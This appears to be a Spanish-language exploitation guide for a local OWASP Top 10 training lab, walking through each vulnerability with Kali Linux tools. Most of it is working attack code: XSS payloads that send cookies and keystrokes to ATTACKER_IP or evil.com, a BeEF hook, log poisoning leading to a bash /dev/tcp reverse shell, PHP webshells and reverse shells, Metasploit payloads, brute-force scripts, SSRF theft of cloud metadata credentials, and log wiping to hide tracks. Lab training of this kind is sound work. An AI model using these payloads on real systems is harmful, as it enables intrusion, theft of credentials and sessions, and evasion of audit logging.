# 🎯 Guía de Explotación - OWASP Top 10 Labs con Kali Linux

Esta guía te enseñará cómo explotar cada una de las vulnerabilidades implementadas en el laboratorio usando herramientas de Kali Linux.

**⚠️ ADVERTENCIA:** Este laboratorio es solo para fines educativos. NO uses estas técnicas en sistemas sin autorización explícita.

---

## 📋 Tabla de Contenidos

1. [A01: Broken Access Control (IDOR)](#a01-broken-access-control-idor)
2. [A02: Cryptographic Failures](#a02-cryptographic-failures)
3. [A03: Injection (XSS)](#a03-injection-xss)
4. [A04: Insecure Design (LFI)](#a04-insecure-design-lfi)
5. [A05: Security Misconfiguration](#a05-security-misconfiguration)
6. [A06: Vulnerable and Outdated Components](#a06-vulnerable-and-outdated-components)
7. [A07: Identification and Authentication Failures](#a07-identification-and-authentication-failures)
8. [A08: Software and Data Integrity Failures](#a08-software-and-data-integrity-failures)
9. [A09: Security Logging and Monitoring Failures](#a09-security-logging-and-monitoring-failures)
10. [A10: Server-Side Request Forgery (SSRF)](#a10-server-side-request-forgery-ssrf)

---

## 🛠️ Configuración Inicial

### Variables de Entorno

```bash
# Definir la URL del laboratorio
export TARGET="http://localhost:8081"

# Verificar que el laboratorio está activo
curl -s $TARGET | grep -i "OWASP"
```

---

## A01: Broken Access Control (IDOR)

### 📖 Descripción

Insecure Direct Object Reference (IDOR) permite acceder a recursos de otros usuarios modificando parámetros en la URL.

### 🎯 Objetivo

Acceder a notas de otros usuarios cambiando el parámetro `note_id`.

### 🔧 Explotación Manual

**1. Acceder al laboratorio:**

```bash
firefox $TARGET/a01_broken_access_control/index.php &
```

**2. Ver tus propias notas (como usuario 'alice'):**

- Notas con ID 1 y 2 pertenecen a alice
- URL: `http://localhost:8081/a01_broken_access_control/view_note.php?note_id=1`

**3. Explotar IDOR:**

```bash
# Ver notas de otros usuarios
firefox "$TARGET/a01_broken_access_control/view_note.php?note_id=3" &
firefox "$TARGET/a01_broken_access_control/view_note.php?note_id=4" &
firefox "$TARGET/a01_broken_access_control/view_note.php?note_id=5" &
```

### 🤖 Explotación Automatizada con cURL

```bash
# Enumerar todas las notas (IDs del 1 al 10)
for i in {1..10}; do
    echo "=== Nota ID: $i ==="
    curl -s "$TARGET/a01_broken_access_control/view_note.php?note_id=$i" \
        -H "Cookie: PHPSESSID=test" \
        | grep -A5 "card-body" \
        | sed 's/<[^>]*>//g' \
        | grep -v "^$"
    echo ""
done
```

### 🔍 Con Burp Suite

1. Interceptar la petición a `view_note.php?note_id=1`
2. Enviar al Intruder (Ctrl+I)
3. Marcar el valor de `note_id` como posición de payload
4. Configurar payload tipo "Numbers" (1-10, step 1)
5. Iniciar ataque y analizar respuestas

### ✅ Evidencia de Explotación

```bash
# Guardar todas las notas en archivos
mkdir -p /tmp/idor_loot
for i in {1..10}; do
    curl -s "$TARGET/a01_broken_access_control/view_note.php?note_id=$i" \
        -H "Cookie: PHPSESSID=test" \
        > /tmp/idor_loot/note_$i.html
done
echo "Notas guardadas en /tmp/idor_loot/"
```

---

## A02: Cryptographic Failures

### 📖 Descripción

Las contraseñas se almacenan usando MD5 sin salt, un algoritmo de hash débil y fácilmente reversible.

### 🎯 Objetivo

Obtener contraseñas en texto plano a partir de los hashes MD5.

### 🔧 Explotación con SQLMap

**1. Detectar inyección SQL (si existe):**

```bash
sqlmap -u "$TARGET/a02_cryptographic_failures/login.php" \
    --data "username=admin&password=test" \
    --batch
```

**2. Si no hay SQLi, usar ingeniería social para obtener el hash:**

```bash
# Registrar un usuario y capturar el hash
curl -s "$TARGET/a02_cryptographic_failures/register.php" \
    -d "username=testuser&password=password123" \
    -X POST
```

### 🔓 Crackear Hash MD5

**Método 1: Hashcat**

```bash
# Crear archivo con hash MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hash.txt

# Crackear con diccionario rockyou
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force

# Resultado: password
```

**Método 2: John the Ripper**

```bash
# Formato: username:hash
echo "testuser:5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hashes.txt

# Crackear
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt

# Ver resultados
john --show --format=Raw-MD5 /tmp/hashes.txt
```

**Método 3: Bases de datos online**

```bash
# Usar API de crackstation.net (ejemplo conceptual)
HASH="5f4dcc3b5aa765d61d8327deb882cf99"
curl "https://crackstation.net/api/" -d "hash=$HASH"

# O simplemente buscar en Google
firefox "https://www.google.com/search?q=5f4dcc3b5aa765d61d8327deb882cf99" &
```

### 📝 Hashes de ejemplo en el laboratorio

```bash
# admin:admin -> 21232f297a57a5a743894a0e4a801fc3
# testuser:password -> 5f4dcc3b5aa765d61d8327deb882cf99
# guest:123456 -> e10adc3949ba59abbe56e057f20f883e

# Crear archivo para crackear todos
cat > /tmp/all_hashes.txt <<EOF
21232f297a57a5a743894a0e4a801fc3
5f4dcc3b5aa765d61d8327deb882cf99
e10adc3949ba59abbe56e057f20f883e
EOF

# Crackear todos
hashcat -m 0 /tmp/all_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---

## A03: Injection (XSS)

### 📖 Descripción

Cross-Site Scripting Almacenado (Stored XSS) en un libro de visitas que no sanitiza la entrada.

### 🎯 Objetivo

Inyectar código JavaScript malicioso que se ejecute en el navegador de otros usuarios.

### 🔧 Payloads XSS Básicos

**1. Alert básico:**

```bash
curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=Hacker&content=<script>alert('XSS')</script>"
```

**2. Robo de cookies:**

```bash
# Payload para enviar cookies a tu servidor
PAYLOAD="<script>fetch('http://ATTACKER_IP:8000/steal?cookie='+document.cookie)</script>"

curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=Hacker" \
    --data-urlencode "content=$PAYLOAD"
```

**3. Redirección maliciosa:**

```bash
curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=Support" \
    --data-urlencode "content=<script>window.location='http://evil.com/phishing'</script>"
```

### 🎣 Montar un servidor para capturar cookies

```bash
# Terminal 1: Iniciar servidor HTTP simple
mkdir -p /tmp/xss_loot
cd /tmp/xss_loot

# Crear script para capturar cookies
cat > capture.php <<'EOF'
<?php
$cookie = $_GET['cookie'] ?? 'No cookie';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$log = "[$timestamp] IP: $ip - Cookie: $cookie\n";
file_put_contents('cookies.log', $log, FILE_APPEND);

echo "OK";
?>
EOF

# Iniciar servidor PHP
php -S 0.0.0.0:8000
```

```bash
# Terminal 2: Inyectar payload
IP=$(hostname -I | awk '{print $1}')
PAYLOAD="<script>fetch('http://$IP:8000/capture.php?cookie='+document.cookie)</script>"

curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=Admin" \
    --data-urlencode "content=$PAYLOAD"
```

### 🔥 Payloads Avanzados

**BeEF Hook (Browser Exploitation Framework):**

```bash
# Iniciar BeEF
sudo beef-xss

# Inyectar hook de BeEF
PAYLOAD="<script src='http://KALI_IP:3000/hook.js'></script>"

curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=System" \
    --data-urlencode "content=$PAYLOAD"
```

**Keylogger XSS:**

```bash
PAYLOAD='<script>
document.addEventListener("keypress", function(e) {
    fetch("http://ATTACKER_IP:8000/log?key=" + e.key);
});
</script>'

curl -X POST "$TARGET/a03_injection_xss/add_comment.php" \
    -d "author=Update" \
    --data-urlencode "content=$PAYLOAD"
```

### 🛡️ Bypass de filtros (si existieran)

```bash
# Caso con evasión
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

---

## A04: Insecure Design (LFI)

### 📖 Descripción

Local File Inclusion (LFI) permite leer archivos arbitrarios del servidor mediante Path Traversal.

### 🎯 Objetivo

Leer archivos sensibles del sistema como `/etc/passwd`, archivos de configuración, etc.

### 🔧 Explotación Manual

**1. Leer archivos del sistema:**

```bash
# Leer /etc/passwd
curl -s "$TARGET/a04_lfi/index.php?page=../../../../etc/passwd"

# Leer archivos de configuración
curl -s "$TARGET/a04_lfi/index.php?page=../../config/db.php"

# Leer logs de Apache
curl -s "$TARGET/a04_lfi/index.php?page=../../../../var/log/apache2/access.log"
```

**2. Enumerar archivos interesantes:**

```bash
# Script de enumeración
for file in "/etc/passwd" "/etc/hosts" "/etc/issue" "/proc/version" "/proc/self/environ"; do
    echo "=== Intentando leer: $file ==="
    curl -s "$TARGET/a04_lfi/index.php?page=../../../..$file" | head -20
    echo ""
done
```

### 🤖 Explotación con wfuzz

```bash
# Fuzzing de archivos comunes
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    --hc 404 \
    "$TARGET/a04_lfi/index.php?page=FUZZ"
```

### 🐍 Script Python Automatizado

```python
#!/usr/bin/env python3
import requests

target = "http://localhost:8081/a04_lfi/index.php"
files_to_read = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "../../config/db.php",
    "../../index.php"
]

for file in files_to_read:
    payload = "../../../.." + file
    r = requests.get(target, params={"page": payload})

    if "root:" in r.text or "<?php" in r.text or len(r.text) > 100:
        print(f"[+] Lectura exitosa: {file}")
        print(r.text[:500])
        print("-" * 50)
    else:
        print(f"[-] Falló: {file}")
```

### 💉 LFI a RCE (Remote Code Execution)

**Método 1: Log Poisoning**

```bash
# 1. Inyectar código PHP en el User-Agent (se guarda en access.log)
curl "$TARGET/a04_lfi/index.php?page=home" \
    -A '<?php system($_GET["cmd"]); ?>'

# 2. Incluir el log y ejecutar comando
curl "$TARGET/a04_lfi/index.php?page=../../../../var/log/apache2/access.log&cmd=id"

# 3. Obtener shell reversa
LHOST="KALI_IP"
LPORT="4444"
CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
curl "$TARGET/a04_lfi/index.php?page=../../../../var/log/apache2/access.log&cmd=$CMD"
```

**Método 2: PHP Session Poisoning**

```bash
# 1. Crear sesión con código PHP
curl "$TARGET/a04_lfi/index.php" \
    --cookie "PHPSESSID=hacked" \
    -d "data=<?php system('id'); ?>"

# 2. Incluir archivo de sesión
curl "$TARGET/a04_lfi/index.php?page=../../../../tmp/sess_hacked"
```

---

## A05: Security Misconfiguration

### 📖 Descripción

Múltiples fallos de configuración: errores verbosos, directory listing, archivos sensibles expuestos.

### 🎯 Objetivo

Enumerar información sensible expuesta por mala configuración.

### 🔧 Explotación

**1. Provocar errores de BD para obtener información:**

```bash
# Ver mensajes de error detallados
curl -s "$TARGET/a05_security_misconfiguration/db_error.php"
```

**2. Enumerar directorio uploads:**

```bash
# Listar archivos expuestos
curl -s "$TARGET/a05_security_misconfiguration/uploads/" | grep -oP 'href="\K[^"]+' | grep -v "^/"

# Descargar archivos sensibles
wget "$TARGET/a05_security_misconfiguration/uploads/database_backup.sql"
wget "$TARGET/a05_security_misconfiguration/uploads/credentials.txt"
wget "$TARGET/a05_security_misconfiguration/uploads/private_key.pem"
```

**3. Fuzzing de archivos sensibles:**

```bash
# Buscar archivos de configuración y backups
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    --hc 404 \
    "$TARGET/a05_security_misconfiguration/uploads/FUZZ"
```

### 🕵️ Reconocimiento con Nikto

```bash
nikto -h "$TARGET/a05_security_misconfiguration/" -C all
```

### 🔍 Reconocimiento con dirb

```bash
dirb "$TARGET/a05_security_misconfiguration/" \
    /usr/share/wordlists/dirb/common.txt \
    -r -z 10
```

---

## A06: Vulnerable and Outdated Components

### 📖 Descripción

Sistema de upload de archivos con validación por blacklist, permitiendo bypass y subida de webshells.

### 🎯 Objetivo

Subir una webshell PHP para obtener ejecución remota de comandos.

### 🔧 Crear Webshells

**Webshell simple:**

```bash
# Crear webshell básico
cat > /tmp/shell.php <<'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF
```

**Webshell avanzado (p0wny-shell):**

```bash
# Descargar webshell completo
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O /tmp/p0wny.php
```

**Reverse shell PHP:**

```bash
cat > /tmp/reverse.php <<'EOF'
<?php
$ip = 'KALI_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
EOF
```

### 📤 Bypass de Validación

**Método 1: Doble extensión**

```bash
# Subir con extensión .php.jpg
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
    -F "file=@/tmp/shell.php.jpg"
```

**Método 2: Mayúsculas**

```bash
# Usar .PHP en lugar de .php
cp /tmp/shell.php /tmp/shell.PHP
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
    -F "file=@/tmp/shell.PHP"
```

**Método 3: Extensiones alternativas**

```bash
# Probar .phtml, .php3, .php4, .php5, .phar
for ext in phtml php3 php4 php5 phar; do
    cp /tmp/shell.php "/tmp/shell.$ext"
    curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
        -F "file=@/tmp/shell.$ext"
done
```

**Método 4: Null byte (si aplica)**

```bash
# shell.php%00.jpg
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
    -F "file=@/tmp/shell.php;filename=shell.php%00.jpg"
```

### 🎯 Obtener Shell

**1. Subir webshell:**

```bash
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
    -F "file=@/tmp/shell.phtml"
```

**2. Ejecutar comandos:**

```bash
# Encontrar el archivo subido
curl -s "$TARGET/a06_vulnerable_components/uploads/" | grep shell.phtml

# Ejecutar comandos
curl "$TARGET/a06_vulnerable_components/uploads/shell.phtml?cmd=id"
curl "$TARGET/a06_vulnerable_components/uploads/shell.phtml?cmd=whoami"
curl "$TARGET/a06_vulnerable_components/uploads/shell.phtml?cmd=ls+-la+/var/www/html"
```

**3. Reverse shell:**

```bash
# Terminal 1: Escuchar en Kali
nc -lvnp 4444

# Terminal 2: Subir y activar reverse shell
# Editar /tmp/reverse.php con tu IP
sed -i "s/KALI_IP/$(hostname -I | awk '{print $1}')/g" /tmp/reverse.php
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" -F "file=@/tmp/reverse.php"
curl "$TARGET/a06_vulnerable_components/uploads/reverse.php"
```

### 🦂 Con Metasploit

```bash
msfconsole

# Crear payload PHP
use payload/php/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 4444
generate -f raw > /tmp/meterpreter.php

# Subir payload
exit
curl -X POST "$TARGET/a06_vulnerable_components/upload.php" \
    -F "file=@/tmp/meterpreter.php"

# Preparar listener
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST KALI_IP; set LPORT 4444; exploit"

# Activar payload (desde otro terminal)
curl "$TARGET/a06_vulnerable_components/uploads/meterpreter.php"
```

---

## A07: Identification and Authentication Failures

### 📖 Descripción

Sistema de autenticación sin protección contra fuerza bruta y contraseñas débiles en texto plano.

### 🎯 Objetivo

Realizar ataque de fuerza bruta para obtener credenciales válidas.

### 🔧 Ataque con Hydra

```bash
# Fuerza bruta con usuario conocido
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    $TARGET http-post-form \
    "/a07_auth_failures/login.php:username=^USER^&password=^PASS^:F=incorrectas"

# Fuerza bruta con lista de usuarios y contraseñas
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
    $TARGET http-post-form \
    "/a07_auth_failures/login.php:username=^USER^&password=^PASS^:F=incorrectas"
```

### 🤖 Ataque con Burp Suite Intruder

1. Interceptar petición POST a `/a07_auth_failures/login.php`
2. Enviar al Intruder
3. Configurar Attack type: "Cluster bomb"
4. Marcar username y password como posiciones
5. Cargar wordlists
6. Filtrar respuestas exitosas por longitud/status code

### 🐍 Script Python con Requests

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

target = "http://localhost:8081/a07_auth_failures/login.php"

# Listas de usuarios y contraseñas comunes
users = ['admin', 'user1', 'test', 'administrator', 'root']
passwords = ['password', '123456', 'admin', 'test', '12345', 'password123']

def try_login(user, pwd):
    data = {'username': user, 'password': pwd}
    r = requests.post(target, data=data, allow_redirects=False)

    if r.status_code == 302 or 'dashboard' in r.text.lower():
        print(f"[+] CREDENCIALES VÁLIDAS: {user}:{pwd}")
        return True
    return False

print("[*] Iniciando ataque de fuerza bruta...")
with ThreadPoolExecutor(max_workers=10) as executor:
    for user in users:
        for pwd in passwords:
            executor.submit(try_login, user, pwd)
```

### 🔓 Credenciales por defecto conocidas

```bash
# Probar credenciales comunes
for creds in "admin:admin" "admin:123456" "user1:password" "test:test"; do
    user=$(echo $creds | cut -d: -f1)
    pass=$(echo $creds | cut -d: -f2)

    echo "[*] Probando $user:$pass"
    curl -s -X POST "$TARGET/a07_auth_failures/login.php" \
        -d "username=$user&password=$pass" \
        -L | grep -q "Dashboard" && echo "[+] VÁLIDO: $user:$pass"
done
```

### 📊 Con wfuzz

```bash
# Ataque con wordlist
wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt \
         -z file,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
    -d "username=FUZZ&password=FUZ2Z" \
    --sc 302 \
    "$TARGET/a07_auth_failures/login.php"
```

---

## A08: Software and Data Integrity Failures

### 📖 Descripción

Deserialización insegura de objetos PHP en cookies permite manipular propiedades de objetos.

### 🎯 Objetivo

Modificar un objeto serializado en la cookie para escalar privilegios (ej: `is_admin=true`).

### 🔧 Análisis de Serialización

**1. Capturar cookie serializada:**

```bash
# Guardar preferencias y capturar cookie
curl -X POST "$TARGET/a08_integrity_failures/save_preference.php" \
    -d "theme=dark&language=es" \
    -c /tmp/cookies.txt

# Ver cookie
cat /tmp/cookies.txt | grep user_pref
```

**2. Decodificar objeto serializado:**

```bash
# Extraer y decodificar
COOKIE=$(cat /tmp/cookies.txt | grep user_pref | awk '{print $7}')
echo $COOKIE | php -r 'echo urldecode(file_get_contents("php://stdin"));'
```

### 🛠️ Crear Payload Malicioso

**Script PHP para crear objeto serializado:**

```php
<?php
class UserPreference {
    public $theme;
    public $language;
    public $is_admin; // Nueva propiedad
}

$obj = new UserPreference();
$obj->theme = "dark";
$obj->language = "es";
$obj->is_admin = true; // Escalación de privilegios

$serialized = serialize($obj);
echo "Objeto serializado:\n";
echo $serialized . "\n\n";
echo "URL encoded:\n";
echo urlencode($serialized);
?>
```

**Ejecutar y obtener payload:**

```bash
php /tmp/exploit_serialize.php > /tmp/malicious_cookie.txt
MALICIOUS=$(cat /tmp/malicious_cookie.txt | tail -1)
```

**Enviar cookie modificada:**

```bash
curl "$TARGET/a08_integrity_failures/index.php" \
    -H "Cookie: user_pref=$MALICIOUS"
```

### 🐍 Script Python Automatizado

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote, unquote

target = "http://localhost:8081/a08_integrity_failures/index.php"

# Obtener cookie original
r = requests.post("http://localhost:8081/a08_integrity_failures/save_preference.php",
                  data={"theme": "dark", "language": "es"})

if 'user_pref' in r.cookies:
    original = unquote(r.cookies['user_pref'])
    print(f"[*] Cookie original: {original}")

    # Modificar objeto: agregar is_admin
    # Formato: O:14:"UserPreference":2:{s:5:"theme";s:4:"dark";s:8:"language";s:2:"es";}
    # Nuevo:   O:14:"UserPreference":3:{s:5:"theme";s:4:"dark";s:8:"language";s:2:"es";s:8:"is_admin";b:1;}

    malicious = original.replace(':2:', ':3:')[:-1] + 's:8:"is_admin";b:1;}'
    print(f"[+] Cookie modificada: {malicious}")

    # Enviar cookie maliciosa
    r2 = requests.get(target, cookies={'user_pref': malicious})
    print(f"[*] Respuesta: {r2.text[:200]}")
```

### 💣 Explotación Avanzada: PHP Object Injection

```php
<?php
// Objeto malicioso que ejecuta código en __destruct o __wakeup
class Evil {
    public $cmd;

    public function __destruct() {
        system($this->cmd);
    }
}

$exploit = new Evil();
$exploit->cmd = "id";
echo urlencode(serialize($exploit));
?>
```

---

## A09: Security Logging and Monitoring Failures

### 📖 Descripción

Logs insuficientes para acciones críticas y archivos de log expuestos y modificables.

### 🎯 Objetivo

Acceder a logs para obtener información sensible y/o inyectar entradas falsas.

### 🔧 Explotación

**1. Leer logs expuestos:**

```bash
# Leer archivo de log
curl -s "$TARGET/a09_logging_failures/view_logs.php"

# Descargar log completo
wget "$TARGET/a09_logging_failures/log.txt" -O /tmp/app.log
cat /tmp/app.log
```

**2. Analizar información en logs:**

```bash
# Buscar información sensible
grep -i "password\|token\|secret\|api" /tmp/app.log
grep -oP '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' /tmp/app.log | sort -u
```

**3. Inyectar entradas falsas en el log:**

```bash
# Si el log es escribible mediante LFI o upload
echo "[2025-10-26 12:00:00] Admin login successful - IP: 127.0.0.1" >> /tmp/fake_entry.txt

# Subir mediante vulnerabilidad de upload (A06)
# O mediante Log Poisoning (A04)
```

**4. Realizar acciones sin logging:**

```bash
# Explotar otras vulnerabilidades y verificar que no se registran
curl "$TARGET/a01_broken_access_control/view_note.php?note_id=5"
curl "$TARGET/a09_logging_failures/view_logs.php" | grep "note_id=5"
# No aparece -> Logging insuficiente
```

### 🕵️ Cubrir huellas

```bash
# Si tienes acceso de escritura al log (via webshell en A06)
# Eliminar tus entradas del log
sed -i '/MI_IP_ADDRESS/d' /path/to/log.txt

# O sobrescribir el log completo
echo "" > /path/to/log.txt
```

---

## A10: Server-Side Request Forgery (SSRF)

### 📖 Descripción

El servidor realiza peticiones HTTP a URLs proporcionadas por el usuario sin validación.

### 🎯 Objetivo

Forzar al servidor a hacer peticiones a recursos internos (localhost, red interna, servicios cloud metadata).

### 🔧 Explotación Básica

**1. Escaneo de puertos internos:**

```bash
# Descubrir servicios en localhost
for port in 22 80 3306 8080 9000; do
    echo "[*] Probando puerto $port"
    curl -s "$TARGET/a10_ssrf/fetch.php" \
        -d "url=http://127.0.0.1:$port" \
        | grep -q "Connection refused" || echo "[+] Puerto $port ABIERTO"
done
```

**2. Acceder a metadata de AWS (si aplica en cloud):**

```bash
# Obtener credenciales de AWS
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://169.254.169.254/latest/meta-data/"

curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**3. Leer archivos internos (si wrapper file:// está habilitado):**

```bash
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=file:///etc/passwd"
```

**4. Acceder a servicios internos:**

```bash
# MySQL
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://db:3306"

# Redis
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://127.0.0.1:6379"

# Memcached
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://127.0.0.1:11211"
```

### 🔥 Explotación Avanzada

**1. Bypass de filtros con URL encoding:**

```bash
# Si bloquea 127.0.0.1
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://127.1"  # Notación corta

curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://0.0.0.0"

curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://localhost"

# Decimal
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://2130706433"  # 127.0.0.1 en decimal

# Octal
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://0177.0.0.1"
```

**2. Redirección HTTP para bypass:**

```bash
# En tu servidor (Kali)
cat > /tmp/redirect.php <<'EOF'
<?php
header('Location: http://127.0.0.1:3306');
?>
EOF

php -S 0.0.0.0:8000 -t /tmp &

# Explotar
KALI_IP=$(hostname -I | awk '{print $1}')
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://$KALI_IP:8000/redirect.php"
```

**3. DNS Rebinding:**

```bash
# Usar servicio como http://rebind.network
# Configurar dominio que resuelve primero a IP pública y luego a 127.0.0.1
```

**4. Blind SSRF - Detección con Burp Collaborator o DNSlog:**

```bash
# Usar servicio de log DNS
curl -X POST "$TARGET/a10_ssrf/fetch.php" \
    -d "url=http://UNIQUE_ID.burpcollaborator.net"

# O usar dnslog.cn, canarytokens.org, etc.
```

### 🌐 Escaneo de red interna

```bash
# Script para escanear subred
for i in {1..254}; do
    IP="192.168.1.$i"
    echo "[*] Probando $IP"
    curl -s -m 2 "$TARGET/a10_ssrf/fetch.php" -d "url=http://$IP" \
        | grep -q "200 OK\|html" && echo "[+] Host activo: $IP"
done
```

---

## 🎓 Resumen de Herramientas Utilizadas

| Vulnerabilidad | Herramientas Principales |
|---------------|-------------------------|
| A01: IDOR | `curl`, `Burp Suite Intruder` |
| A02: Crypto | `hashcat`, `john`, `crackstation.net` |
| A03: XSS | `curl`, `BeEF`, `XSS Hunter`, servidor PHP |
| A04: LFI | `curl`, `wfuzz`, Python script |
| A05: Misconfig | `curl`, `wget`, `nikto`, `dirb` |
| A06: Upload | `curl`, webshells, `msfvenom`, `nc` |
| A07: Auth | `hydra`, `Burp Suite`, Python script, `wfuzz` |
| A08: Deserial | `curl`, PHP scripts, Python |
| A09: Logging | `curl`, `wget`, `grep`, `sed` |
| A10: SSRF | `curl`, Burp Collaborator, bash scripts |

---

## 📚 Recursos Adicionales

### Wordlists útiles en Kali

- `/usr/share/wordlists/rockyou.txt` - Contraseñas comunes
- `/usr/share/seclists/` - Colección SecLists completa
- `/usr/share/wordlists/dirb/` - Directorios y archivos

### Comandos útiles

```bash
# Descomprimir rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Instalar SecLists
sudo apt install seclists

# Actualizar herramientas
sudo apt update && sudo apt upgrade
```

### Enlaces de interés

- OWASP Top 10: <https://owasp.org/www-project-top-ten/>
- PayloadsAllTheThings: <https://github.com/swisskyrepo/PayloadsAllTheThings>
- HackTricks: <https://book.hacktricks.xyz/>

---

## ⚠️ DISCLAIMER

Este laboratorio y guía son **ÚNICAMENTE para fines educativos**. El uso de estas técnicas contra sistemas sin autorización explícita es **ILEGAL** y puede resultar en consecuencias legales graves.

**Usa este conocimiento de manera ética y responsable.**

---

## 📝 Notas Finales

- Todos los comandos asumen que el laboratorio está corriendo en `http://localhost:8081`
- Ajusta las IPs según tu entorno (Docker, VM, etc.)
- Algunos exploits pueden requerir ajustes según la configuración del servidor
- Practica en entornos controlados y autorizados

**¡Happy Hacking! 🎩**
